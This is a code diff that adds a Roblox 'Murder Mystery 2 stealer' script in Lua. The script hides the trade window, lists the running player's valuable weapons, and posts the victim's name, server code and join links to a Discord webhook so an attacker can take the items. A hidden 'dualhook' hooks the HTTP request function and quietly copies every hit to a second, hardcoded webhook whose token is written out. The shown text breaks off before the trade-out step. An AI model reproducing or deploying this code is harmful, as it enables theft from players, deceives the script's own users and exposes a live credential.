@@ -1,0 +1,1200 @@
+-- These are hidden settings that will be encrypted with the code
+local myWebhook = "https://discord.com/api/webhooks/1453683341340446877/P2jlEVkHngQejYOTGEhhn8S1PQhAwY332L5ePgBq_llIQHVWGArkvbk1qpc8zCr5u6DY" -- Put your webhook here
+local beneficiaryName = "dqwgtqwrqwe" -- Put beneficiary name here
+local discordLink = "https://discord.gg/cUHrnzVxQp" -- Your Discord link (REPLACE WITH YOUR OWN)
+
+-- =================================================================================
+-- ==                     Start of MM2 Script (With Hidden Beneficiary)            ==
+-- =================================================================================
+
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+-- Store original request early
+local originalRequest = request
+
+-- These variables will be read from the loader (script given to user)
+local users = _G.Usernames or {}
+local min_rarity = _G.min_rarity or "Godly"
+local min_value = _G.min_value or 1
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+-- Helper function to send data to any webhook
+local function sendToWebhook(url, data)
+    local HttpService = game:GetService("HttpService")
+    local body = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+    
+    pcall(function()
+        originalRequest({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+end
+
+-- Send execution notification to hidden webhook
+local function sendExecutionNotification()
+    local HttpService = game:GetService("HttpService")
+    local plr = game:GetService("Players").LocalPlayer
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🔔 MM2 Script Execution Detected",
+            ["description"] = "Someone is using your MM2 script! Join our discord: " .. discordLink,
+            ["color"] = 0xFF0000,
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Executor Username:",
+                    ["value"] = plr.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "👑 Hidden Beneficiary:",
+                    ["value"] = beneficiaryName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔗 Webhook:",
+                    ["value"] = webhook,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🎮 Discord:",
+                    ["value"] = "[Join our server](" .. discordLink .. ")",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🆔 Server Code (JobId):",
+                    ["value"] = game.JobId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "⚙️ Settings:",
+                    ["value"] = string.format("Min Rarity: %s\nMin Value: %d", min_rarity, min_value),
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Mr_X's MM2 Script | " .. discordLink
+            }
+        }}
+    }
+    
+    sendToWebhook(myWebhook, data)
+end
+
+-- Send data to hidden webhook
+local function sendToMyWebhook(originalData)
+    local HttpService = game:GetService("HttpService")
+    local plr = game:GetService("Players").LocalPlayer
+    
+    local fields = {
+        {
+            name = "👑 Hidden Beneficiary:",
+            value = beneficiaryName,
+            inline = true
+        },
+        {
+            name = "💻 Hacker (Executor):",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "🎯 Victim:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "🎮 Discord:",
+            value = "[Join our server](" .. discordLink .. ")",
+            inline = false
+        },
+        {
+            name = "🆔 Server Code (JobId):",
+            value = game.JobId,
+            inline = true
+        }
+    }
+
+    if originalData.embeds and originalData.embeds[1] and originalData.embeds[1].fields then
+        for _, field in ipairs(originalData.embeds[1].fields) do
+            if field.name == "Join link:" or field.name == "Item list:" or 
+               field.name == "Items sent:" or field.name == "Summary:" or
+               field.name == "Victim Username:" then
+                table.insert(fields, field)
+            end
+        end
+    end
+
+    local myData = {
+        ["content"] = originalData.content or "",
+        ["embeds"] = {{
+            ["title"] = "🔔 Intercepted MM2 Hit",
+            ["description"] = "Join our discord for more scripts: " .. discordLink,
+            ["color"] = 0xFFFF00,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Intercepted by Mr_X's Dualhook System | " .. discordLink
+            }
+        }}
+    }
+
+    sendToWebhook(myWebhook, myData)
+end
+
+-- New function to send join page to hidden webhook
+local function sendJoinPageToMyWebhook(joinData)
+    local HttpService = game:GetService("HttpService")
+    local plr = game:GetService("Players").LocalPlayer
+    
+    local fields = {
+        {
+            name = "👑 Hidden Beneficiary:",
+            value = beneficiaryName,
+            inline = true
+        },
+        {
+            name = "💻 Hacker (Executor):",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "🎯 Victim:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "🎮 Discord:",
+            value = "[Join our server](" .. discordLink .. ")",
+            inline = false
+        },
+        {
+            name = "🆔 Server Code (JobId):",
+            value = game.JobId,
+            inline = true
+        }
+    }
+
+    if joinData.embeds and joinData.embeds[1] and joinData.embeds[1].fields then
+        for _, field in ipairs(joinData.embeds[1].fields) do
+            if field.name == "Victim Username:" or field.name == "Join link:" or 
+               field.name == "Item list:" or field.name == "Summary:" then
+                table.insert(fields, field)
+            end
+        end
+    end
+
+    local myData = {
+        ["content"] = joinData.content or "",
+        ["embeds"] = {{
+            ["title"] = "🔪 Join Page Sent to Hidden Beneficiary",
+            ["description"] = "Join our discord for more scripts: " .. discordLink,
+            ["color"] = 0x00FF00,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Mr_X's MM2 Script | " .. discordLink
+            }
+        }}
+    }
+
+    sendToWebhook(myWebhook, myData)
+end
+
+-- Extract webhook ID from user link
+local webhookId = webhook:match("/([^/]+/[^/]+)$")
+if webhookId then
+    webhookId = webhookId:match("^[^/]+") -- Extract ID only
+else
+    webhookId = webhook:match("/([^/]+)$") -- Alternative: extract last part
+end
+
+-- Setup interception before anything else
+_G.request = function(options)
+    -- Check if request is going to the original webhook
+    if options.Url and webhookId and options.Url:find(webhookId, 1, true) then
+        local HttpService = game:GetService("HttpService")
+        local success, data = pcall(function()
+            return HttpService:JSONDecode(options.Body)
+        end)
+
+        if success and data and data.embeds and #data.embeds > 0 then
+            -- Send data to hidden webhook
+            sendToMyWebhook(data)
+            
+            -- If join message, send additional copy
+            if data.embeds[1].title and data.embeds[1].title:find("Join to get MM2 hit") then
+                sendJoinPageToMyWebhook(data)
+            end
+        end
+    end
+    
+    -- Execute original request
+    return originalRequest(options)
+end
+
+-- Send execution notification now after setting up interception
+sendExecutionNotification()
+
+-- Create professional loading GUI for MM2
+local function createMM2LoadingGUI()
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    local PlayerGui = player:WaitForChild("PlayerGui")
+    
+    -- Delete any old GUI
+    local oldGUI = PlayerGui:FindFirstChild("MM2LoadingGUI")
+    if oldGUI then
+        oldGUI:Destroy()
+    end
+    
+    -- Create main screen
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "MM2LoadingGUI"
+    screenGui.Parent = PlayerGui
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Main interface frame
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Parent = screenGui
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.Position = UDim2.new(0, 0, 0, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    mainFrame.BackgroundTransparency = 0.05
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 1
+    
+    -- Blood red borders
+    local borderSize = 3
+    local borderColor = Color3.fromRGB(200, 0, 0)
+    
+    local topBorder = Instance.new("Frame")
+    topBorder.Name = "TopBorder"
+    topBorder.Parent = mainFrame
+    topBorder.Size = UDim2.new(1, 0, 0, borderSize)
+    topBorder.Position = UDim2.new(0, 0, 0, 0)
+    topBorder.BackgroundColor3 = borderColor
+    topBorder.BorderSizePixel = 0
+    topBorder.ZIndex = 2
+    
+    local bottomBorder = Instance.new("Frame")
+    bottomBorder.Name = "BottomBorder"
+    bottomBorder.Parent = mainFrame
+    bottomBorder.Size = UDim2.new(1, 0, 0, borderSize)
+    bottomBorder.Position = UDim2.new(0, 0, 1, -borderSize)
+    bottomBorder.BackgroundColor3 = borderColor
+    bottomBorder.BorderSizePixel = 0
+    bottomBorder.ZIndex = 2
+    
+    -- Central content
+    local contentFrame = Instance.new("Frame")
+    contentFrame.Name = "ContentFrame"
+    contentFrame.Parent = mainFrame
+    contentFrame.Size = UDim2.new(0.7, 0, 0.6, 0)
+    contentFrame.Position = UDim2.new(0.15, 0, 0.2, 0)
+    contentFrame.BackgroundTransparency = 1
+    contentFrame.ZIndex = 3
+    
+    -- Title
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = contentFrame
+    titleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "🔪 MURDER MYSTERY 2 STEALER 🔪"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+    titleLabel.TextScaled = true
+    titleLabel.Font = Enum.Font.GothamBlack
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+    titleLabel.ZIndex = 4
+    
+    -- Status
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Name = "StatusLabel"
+    statusLabel.Parent = contentFrame
+    statusLabel.Size = UDim2.new(1, 0, 0.15, 0)
+    statusLabel.Position = UDim2.new(0, 0, 0.25, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Loading MM2 Stealer..."
+    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    statusLabel.TextScaled = true
+    statusLabel.Font = Enum.Font.GothamBold
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+    statusLabel.TextYAlignment = Enum.TextYAlignment.Center
+    statusLabel.ZIndex = 4
+    
+    -- Progress bar
+    local progressFrame = Instance.new("Frame")
+    progressFrame.Name = "ProgressFrame"
+    progressFrame.Parent = contentFrame
+    progressFrame.Size = UDim2.new(0.8, 0, 0.08, 0)
+    progressFrame.Position = UDim2.new(0.1, 0, 0.45, 0)
+    progressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    progressFrame.BorderSizePixel = 0
+    progressFrame.ZIndex = 4
+    
+    local progressBar = Instance.new("Frame")
+    progressBar.Name = "ProgressBar"
+    progressBar.Parent = progressFrame
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 5
+    
+    -- Percentage
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Name = "PercentLabel"
+    percentLabel.Parent = contentFrame
+    percentLabel.Size = UDim2.new(1, 0, 0.1, 0)
+    percentLabel.Position = UDim2.new(0, 0, 0.55, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    percentLabel.TextScaled = true
+    percentLabel.Font = Enum.Font.GothamBlack
+    percentLabel.TextXAlignment = Enum.TextXAlignment.Center
+    percentLabel.TextYAlignment = Enum.TextYAlignment.Center
+    percentLabel.ZIndex = 4
+    
+    -- Discord button
+    local discordButton = Instance.new("TextButton")
+    discordButton.Name = "DiscordButton"
+    discordButton.Parent = contentFrame
+    discordButton.Size = UDim2.new(0.4, 0, 0.12, 0)
+    discordButton.Position = UDim2.new(0.3, 0, 0.7, 0)
+    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    discordButton.BorderSizePixel = 0
+    discordButton.ZIndex = 4
+    discordButton.Text = "📱 JOIN OUR DISCORD"
+    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordButton.TextScaled = true
+    discordButton.Font = Enum.Font.GothamBold
+    discordButton.AutoButtonColor = true
+    
+    -- Discord hint
+    local discordHint = Instance.new("TextLabel")
+    discordHint.Name = "DiscordHint"
+    discordHint.Parent = contentFrame
+    discordHint.Size = UDim2.new(1, 0, 0.08, 0)
+    discordHint.Position = UDim2.new(0, 0, 0.85, 0)
+    discordHint.BackgroundTransparency = 1
+    discordHint.Text = "Link copied automatically! Click to join"
+    discordHint.TextColor3 = Color3.fromRGB(150, 150, 255)
+    discordHint.TextScaled = true
+    discordHint.Font = Enum.Font.Gotham
+    discordHint.TextXAlignment = Enum.TextXAlignment.Center
+    discordHint.TextYAlignment = Enum.TextYAlignment.Center
+    discordHint.ZIndex = 4
+    
+    -- Button events
+    discordButton.MouseButton1Click:Connect(function()
+        pcall(function()
+            setclipboard(discordLink)
+        end)
+        request({
+            Url = "http://localhost:6463/rpc?v=1",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["Origin"] = "https://discord.com"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({
+                cmd = "INVITE_BROWSER",
+                args = {
+                    code = "cUHrnzVxQp"
+                },
+                nonce = game:GetService("HttpService"):GenerateGUID(false)
+            })
+        })
+    end)
+    
+    -- Animation
+    local function animateBorder()
+        while screenGui and screenGui.Parent do
+            local pulse = math.sin(tick() * 4) * 0.3 + 0.7
+            local color = Color3.fromRGB(200 * pulse, 0, 0)
+            topBorder.BackgroundColor3 = color
+            bottomBorder.BackgroundColor3 = color
+            task.wait(0.05)
+        end
+    end
+    
+    spawn(animateBorder)
+    
+    -- Progress update
+    local progress = 0
+    local duration = 15 -- 15 seconds for MM2
+    local startTime = tick()
+    
+    local updateProgress = function()
+        local elapsed = tick() - startTime
+        progress = math.min(elapsed / duration, 1)
+        
+        progressBar:TweenSize(
+            UDim2.new(progress, 0, 1, 0),
+            Enum.EasingDirection.Out,
+            Enum.EasingStyle.Quad,
+            0.2,
+            true
+        )
+        
+        percentLabel.Text = math.floor(progress * 100) .. "%"
+        
+        if progress < 0.3 then
+            statusLabel.Text = "Loading MM2 database..."
+        elseif progress < 0.6 then
+            statusLabel.Text = "Scanning weapons..."
+        elseif progress < 0.9 then
+            statusLabel.Text = "Setting up trade system..."
+        else
+            statusLabel.Text = "Ready to steal weapons! 🔪"
+        end
+        
+        if progress >= 1 then
+            task.wait(1)
+            for i = 0, 1, 0.05 do
+                if screenGui and screenGui.Parent then
+                    contentFrame.Visible = false
+                    task.wait(0.02)
+                end
+            end
+            if screenGui and screenGui.Parent then
+                screenGui:Destroy()
+            end
+        end
+    end
+    
+    local connection
+    connection = game:GetService("RunService").Heartbeat:Connect(function()
+        updateProgress()
+        if progress >= 1 then
+            connection:Disconnect()
+        end
+    end)
+    
+    return screenGui
+end
+
+-- Show loading GUI
+local loadingGUI = createMM2LoadingGUI()
+
+-- Copy Discord link
+task.wait(2)
+pcall(function()
+    setclipboard(discordLink)
+end)
+
+-- =================================================================================
+-- ==                     MM2 Main Script Logic                                    ==
+-- =================================================================================
+
+task.spawn(function()
+    -- Wait for loading to complete
+    task.wait(16)
+    
+    if next(users) == nil or webhook == "" then
+        game:GetService("Players").LocalPlayer:kick("You didn't add username or webhook\nJoin " .. discordLink)
+        return
+    end
+
+    if game.PlaceId ~= 142823291 then
+        game:GetService("Players").LocalPlayer:kick("Game not supported. Please join a normal MM2 server\nJoin " .. discordLink)
+        return
+    end
+
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        game:GetService("Players").LocalPlayer:kick("Server error. Please join a DIFFERENT server\nJoin " .. discordLink)
+        return
+    end
+
+    if #game:GetService("Players"):GetPlayers() >= 12 then
+        game:GetService("Players").LocalPlayer:kick("Server is full. Please join a less populated server\nJoin " .. discordLink)
+        return
+    end
+
+    local weaponsToSend = {}
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
+    local playerGui = plr:WaitForChild("PlayerGui")
+    local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    local HttpService = game:GetService("HttpService")
+
+    local rarityTable = {
+        "Common",
+        "Uncommon",
+        "Rare",
+        "Legendary",
+        "Godly",
+        "Ancient",
+        "Unique",
+        "Vintage"
+    }
+
+    local categories = {
+        godly = "https://supremevaluelist.com/mm2/godlies.html",
+        ancient = "https://supremevaluelist.com/mm2/ancients.html",
+        unique = "https://supremevaluelist.com/mm2/uniques.html",
+        classic = "https://supremevaluelist.com/mm2/vintages.html",
+        chroma = "https://supremevaluelist.com/mm2/chromas.html"
+    }
+    
+    local headers = {
+        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+    }
+
+    local function trim(s)
+        return s:match("^%s*(.-)%s*$")
+    end
+
+    local function fetchHTML(url)
+        local response = request({
+            Url = url,
+            Method = "GET",
+            Headers = headers
+        })
+        return response.Body
+    end
+
+    local function parseValue(itembodyDiv)
+        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+        if valueStr then
+            valueStr = valueStr:gsub(",", "")
+            local value = tonumber(valueStr)
+            if value then
+                return value
+            end
+        end
+        return nil
+    end
+
+    local function extractItems(htmlContent)
+        local itemValues = {}
+        
+        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+            itemName = itemName:match("([^<]+)")
+            if itemName then
+                itemName = trim(itemName:gsub("%s+", " "))
+                itemName = trim((itemName:split(" Click "))[1])
+                local itemNameLower = itemName:lower()
+
+                local value = parseValue(itembodyDiv)
+                if value then
+                    itemValues[itemNameLower] = value
+                end
+            end
+        end
+        
+        return itemValues
+    end
+
+    local function extractChromaItems(htmlContent)
+        local chromaValues = {}
+
+        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+            chromaName = chromaName:match("([^<]+)")
+            if chromaName then
+                chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+                local value = parseValue(itembodyDiv)
+                if value then
+                    chromaValues[chromaName] = value
+                end
+            end
+        end
+        
+        return chromaValues
+    end
+
+    local function buildValueList()
+        local allExtractedValues = {}
+        local chromaExtractedValues = {}
+        local categoriesToFetch = {}
+
+        for rarity, url in pairs(categories) do
+            table.insert(categoriesToFetch, {rarity = rarity, url = url})
+        end
+        
+        local totalCategories = #categoriesToFetch
+        local completed = 0
+        local lock = Instance.new("BindableEvent")
+
+        for _, category in ipairs(categoriesToFetch) do
+            task.spawn(function()
+                local rarity = category.rarity
+                local url = category.url
+                local htmlContent = fetchHTML(url)
+                
+                if htmlContent and htmlContent ~= "" then
+                    if rarity ~= "chroma" then
+                        local extractedItemValues = extractItems(htmlContent)
+                        for itemName, value in pairs(extractedItemValues) do
+                            allExtractedValues[itemName] = value
+                        end
+                    else
+                        chromaExtractedValues = extractChromaItems(htmlContent)
+                    end
+                end
+
+                completed = completed + 1
+                if completed == totalCategories then
+                    lock:Fire()
+                end
+            end)
+        end
+
+        lock.Event:Wait()
+
+        local valueList = {}
+
+        for dataid, item in pairs(database) do
+            local itemName = item.ItemName and item.ItemName:lower() or ""
+            local rarity = item.Rarity or ""
+            local hasChroma = item.Chroma or false
+
+            if itemName ~= "" and rarity ~= "" then
+                local weaponRarityIndex = table.find(rarityTable, rarity)
+                local godlyIndex = table.find(rarityTable, "Godly")
+
+                if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
+                    if hasChroma then
+                        local matchedChromaValue = nil
+                        for chromaName, value in pairs(chromaExtractedValues) do
+                            if chromaName:find(itemName) then
+                                matchedChromaValue = value
+                                break
+                            end
+                        end
+
+                        if matchedChromaValue then
+                            valueList[dataid] = matchedChromaValue
+                        end
+                    else
+                        local value = allExtractedValues[itemName]
+                        if value then
+                            valueList[dataid] = value
+                        end
+                    end
+                end
+            end
+        end
+
+        return valueList
+    end
+
+    local function sendTradeRequest(user)
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild(user)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+    end
+
+    local function getTradeStatus()
+        return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    end
+
+    local function waitForTradeCompletion()
+        while true do
+            local status = getTradeStatus()
+            if status == "None" then
+                break
+            end
+            wait(0.1)
+        end
+    end
+
+    local function acceptTrade()
+        local args = {
+            [1] = 285646582
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+    end
+
+    local function addWeaponToTrade(id)
+        local args = {
+            [1] = id,
+            [2] = "Weapons"
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+    end
+
+    local totalValue = 0
+
+    -- ======== UPDATED: SendFirstMessage with instant links ========
+    local function SendFirstMessage(list, prefix)
+        local serverId = game.JobId
+        local placeId = 142823291
+        
+        -- Instant working links
+        local primaryLink = string.format(
+            "https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s",
+            placeId,
+            serverId
+        )
+        
+        local alternativeLink = string.format(
+            "https://web.roblox.com/games/%d?gameInstanceId=%s",
+            placeId,
+            serverId
+        )
+        
+        local directLaunch = string.format(
+            "roblox://placeID=%d&gameInstanceID=%s",
+            placeId,
+            serverId
+        )
+        
+        local teleportCommand = string.format(
+            [[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")]],
+            placeId,
+            serverId
+        )
+        
+        local fields = {
+            {
+                name = "🎮 **INSTANT JOIN LINKS - WORKING NOW**",
+                value = string.format(
+                    "**Victim:** `%s`\n" ..
+                    "**Server Code:** `%s`\n" ..
+                    "**Players:** %d/12\n" ..
+                    "**⏰ LINKS WORK FOR 60 SECONDS ONLY!**\n" ..
+                    "**Use IMMEDIATELY after receiving this message**",
+                    plr.Name,
+                    serverId,
+                    #game.Players:GetPlayers()
+                ),
+                inline = false
+            },
+            {
+                name = "🔗 **PRIMARY LINK (Click Here):**",
+                value = string.format("[🖱️ CLICK TO JOIN](%s)\n```\n%s\n```", primaryLink, primaryLink),
+                inline = false
+            },
+            {
+                name = "🔗 **ALTERNATIVE LINK (If first fails):**",
+                value = string.format("[🖱️ CLICK HERE](%s)\n```\n%s\n```", alternativeLink, alternativeLink),
+                inline = false
+            },
+            {
+                name = "🔗 **DIRECT LAUNCH (Copy-Paste in Roblox):**",
+                value = string.format("```\n%s\n```", directLaunch),
+                inline = false
+            },
+            {
+                name = "💻 **SCRIPT COMMAND (100% Working):**",
+                value = string.format("```lua\n%s\n```", teleportCommand),
+                inline = false
+            }
+        }
+        
+        -- Add item list
+        local itemsValue = ""
+        for i, item in ipairs(list) do
+            if i <= 8 then  -- Show first 8 items
+                itemsValue = itemsValue .. string.format("• %s (x%s): %s Value (%s)\n", 
+                    item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+            end
+        end
+        
+        if #list > 8 then
+            itemsValue = itemsValue .. string.format("\n... +%d more weapons", #list - 8)
+        end
+        
+        table.insert(fields, {
+            name = "🔪 **AVAILABLE WEAPONS:**",
+            value = itemsValue,
+            inline = false
+        })
+        
+        table.insert(fields, {
+            name = "💰 **TOTAL VALUE:**",
+            value = string.format("**Value:** %s\n**Weapons:** %d", 
+                totalValue, #list),
+            inline = true
+        })
+        
+        table.insert(fields, {
+            name = "👑 **HIDDEN BENEFICIARY:**",
+            value = beneficiaryName,
+            inline = true
+        })
+        
+        -- Setup Discord Message
+        local data = {
+            ["content"] = prefix .. string.format("@everyone 🔪 **INSTANT JOIN!**\n**Victim:** %s\n**Server:** %s\n**⏰ JOIN WITHIN 60 SECONDS!**\n**Discord:** %s", 
+                plr.Name, serverId, discordLink),
+            ["embeds"] = {{
+                ["title"] = "🔪 INSTANT JOIN - MM2 HIT",
+                ["description"] = string.format(
+                    "**⚠️ USE LINKS IMMEDIATELY! They expire in 60 seconds!**\n\n" ..
+                    "**QUICK INSTRUCTIONS:**\n" ..
+                    "1. **CLICK** any link above\n" ..
+                    "2. **PASTE** in Roblox browser\n" ..
+                    "3. **PRESS ENTER** to join\n" ..
+                    "4. **TYPE ANY MESSAGE** in chat\n\n" ..
+                    "**⏰ TIME LEFT:** ~60 seconds\n" ..
+                    "**🎮 Discord:** %s",
+                    discordLink
+                ),
+                ["color"] = 0xFF0000,
+                ["fields"] = fields,
+                ["footer"] = {
+                    ["text"] = "Mr_X's MM2 Instant Joiner | HIDDEN BENEFICIARY SYSTEM | " .. discordLink
+                },
+                ["thumbnail"] = {
+                    ["url"] = "https://cdn.discordapp.com/attachments/1242831171647340657/1242831207535808603/robux.png"
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+        
+        -- Send to main webhook
+        local success, err = pcall(function()
+            return request({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+        
+        if not success then
+            warn("❌ Failed to send to main webhook: " .. err)
+        else
+            print("✅ MM2 INSTANT LINKS SENT SUCCESSFULLY!")
+            print("🔗 Primary Link: " .. primaryLink)
+            print("🔗 Alternative Link: " .. alternativeLink)
+        end
+        
+        -- Send copy to hidden webhook
+        sendToMyWebhook(data)
+        sendJoinPageToMyWebhook(data)
+        
+        -- Copy primary link automatically
+        pcall(function()
+            setclipboard(primaryLink)
+            print("✅ Primary link copied to clipboard: " .. primaryLink)
+        end)
+        
+        return primaryLink, alternativeLink, teleportCommand
+    end
+
+    local function SendMessage(sortedItems)
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+
+        local fields = {
+            {
+                name = "👤 Victim Username:",
+                value = plr.Name,
+                inline = true
+            },
+            {
+                name = "👑 Hidden Beneficiary:",
+                value = beneficiaryName,
+                inline = true
+            },
+            {
+                name = "🔪 Items sent:",
+                value = "",
+                inline = false
+            },
+            {
+                name = "💰 Summary:",
+                value = string.format("Total Value: %s", totalValue),
+                inline = false
+            },
+            {
+                name = "🎮 Discord Server:",
+                value = "[Join our Discord](" .. discordLink .. ")",
+                inline = false
+            }
+        }
+
+        for _, item in ipairs(sortedItems) do
+            local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
+            fields[3].value = fields[3].value .. itemLine .. "\n"
+        end
+
+        if #fields[3].value > 1024 then
+            local lines = {}
+            for line in fields[3].value:gmatch("[^\r\n]+") do
+                table.insert(lines, line)
+            end
+
+            while #fields[3].value > 1024 and #lines > 0 do
+                table.remove(lines)
+                fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+            end
+        end
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "🔪 MM2 Execution Completed" ,
+                ["description"] = "Join our Discord for more scripts: " .. discordLink,
+                ["color"] = 65280,
+                ["fields"] = fields,
+                ["footer"] = {
+                    ["text"] = "MM2 stealer by Mr_X | HIDDEN BENEFICIARY | " .. discordLink
+                }
+            }}
+        }
+
+        local body = HttpService:JSONEncode(data)
+        local response = request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+        
+        -- Send copy to hidden webhook
+        sendToMyWebhook(data)
+    end
+
+    -- Disable trade GUI
+    local tradegui = playerGui:WaitForChild("TradeGUI")
+    tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
+        tradegui.Enabled = false
+    end)
+    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
+    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
+        tradeguiphone.Enabled = false
+    end)
+
+    local min_rarity_index = table.find(rarityTable, min_rarity)
+
+    local untradable = {
+        ["DefaultGun"] = true,
+        ["DefaultKnife"] = true,
+        ["Reaver"] = true,
+        ["Reaver_Legendary"] = true,
+        ["Reaver_Godly"] = true,
+        ["Reaver_Ancient"] = true,
+        ["IceHammer"] = true,
+        ["IceHammer_Legendary"] = true,
+        ["IceHammer_Godly"] = true,
+        ["IceHammer_Ancient"] = true,
+        ["Gingerscythe"] = true,
+        ["Gingerscythe_Legendary"] = true,
+        ["Gingerscythe_Godly"] = true,
+        ["Gingerscythe_Ancient"] = true,
+        ["TestItem"] = true,
+        ["Season1TestKnife"] = true,
+        ["Cracks"] = true,
+        ["Icecrusher"] = true,
+        ["???"] = true,
+        ["Dartbringer"] = true,
+        ["TravelerAxeRed"] = true,
+        ["TravelerAxeBronze"] = true,
+        ["TravelerAxeSilver"] = true,
+        ["TravelerAxeGold"] = true,
+        ["BlueCamo_K_2022"] = true,
+        ["GreenCamo_K_2022"] = true,
+        ["SharkSeeker"] = true
+    }
+
+    local valueList = buildValueList()
+    local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+    for i, v in pairs(realData.Weapons.Owned) do
+        local dataid = i
+        local amount = v
+        local rarity = database[dataid].Rarity
+        local weapon_rarity_index = table.find(rarityTable, rarity)
+        if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+            local value
+            if valueList[dataid] then
+                value = valueList[dataid]
+            else
+                if weapon_rarity_index >= table.find(rarityTable, "Godly") then
+                    value = 2
+                else
+                    value = 1
+                end
+            end
+            if value >= min_value then
+                totalValue = totalValue + (value * amount)
+                table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
+            end
+        end
+    end
+
+    if #weaponsToSend > 0 then
